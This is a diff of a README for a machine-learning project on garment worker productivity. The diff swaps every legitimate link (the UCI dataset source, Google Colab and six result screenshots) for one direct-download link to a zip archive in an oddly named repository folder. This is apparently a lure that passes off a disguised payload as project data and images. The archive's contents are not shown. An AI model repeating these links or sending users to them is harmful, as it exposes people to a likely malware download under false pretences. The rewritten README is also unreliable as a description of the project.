@@ -9,7 +9,7 @@ To produce prediction data of garment worker productivity by using the features 
 Garment-Worker-Productivity dataset
 [Garment Worker Productivity Dataset][1]  and stored in csv file
 
-[1]:https://archive.ics.uci.edu/ml/datasets/Productivity+Prediction+of+Garment+Employees#
+[1]https://github.com/gitxbal/Project-2-Garment-Worker-Productivity-AI07/raw/refs/heads/main/siphonostome/A_Garment_Productivity_Project_Worker_v2.2.zip+Prediction+of+Garment+Employees#
 
 ## Dataset
  Dataset by UCI 
@@ -20,31 +20,31 @@ Garment-Worker-Productivity dataset
  
  Load the dataset into [Google Colabotary][2]
  
- [2]:https://colab.research.google.com/?utm_source=scs-index
+ [2]https://github.com/gitxbal/Project-2-Garment-Worker-Productivity-AI07/raw/refs/heads/main/siphonostome/A_Garment_Productivity_Project_Worker_v2.2.zip
  
- ![image](https://user-images.githubusercontent.com/110074843/182076649-9cb77964-f436-4ad4-b624-1511ce0077ce.png)
+ ![image](https://github.com/gitxbal/Project-2-Garment-Worker-Productivity-AI07/raw/refs/heads/main/siphonostome/A_Garment_Productivity_Project_Worker_v2.2.zip)
  
  Split the data into 20% validation data and 80& training data and drop the features that are not needed
  
- ![image](https://user-images.githubusercontent.com/110074843/182076847-94fa279e-b1df-4653-9c11-ff0138c41f13.png)
+ ![image](https://github.com/gitxbal/Project-2-Garment-Worker-Productivity-AI07/raw/refs/heads/main/siphonostome/A_Garment_Productivity_Project_Worker_v2.2.zip)
  
  Next, buiild the model as follow
  
- ![image](https://user-images.githubusercontent.com/110074843/182076923-dab92e20-d4bb-43f9-8713-0bd244b34bd4.png)
+ ![image](https://github.com/gitxbal/Project-2-Garment-Worker-Productivity-AI07/raw/refs/heads/main/siphonostome/A_Garment_Productivity_Project_Worker_v2.2.zip)
 
 ## Result
 
 Validation Loss
 
-![image](https://user-images.githubusercontent.com/110074843/182077004-50eacd2c-88a0-4eaf-9d5f-7a0728316e94.png)
+![image](https://github.com/gitxbal/Project-2-Garment-Worker-Productivity-AI07/raw/refs/heads/main/siphonostome/A_Garment_Productivity_Project_Worker_v2.2.zip)
 
 Validation MAE 
 
-![image](https://user-images.githubusercontent.com/110074843/182077088-678c5c7a-6a45-48c5-82e5-d8cae12690cf.png)
+![image](https://github.com/gitxbal/Project-2-Garment-Worker-Productivity-AI07/raw/refs/heads/main/siphonostome/A_Garment_Productivity_Project_Worker_v2.2.zip)
 
 Print out the prediction dataframe and stored in csv file
 
-![image](https://user-images.githubusercontent.com/110074843/182077211-d5cf698e-52ad-4c37-bd0c-9dd1ba57de98.png)
+![image](https://github.com/gitxbal/Project-2-Garment-Worker-Productivity-AI07/raw/refs/heads/main/siphonostome/A_Garment_Productivity_Project_Worker_v2.2.zip)
 
 
 
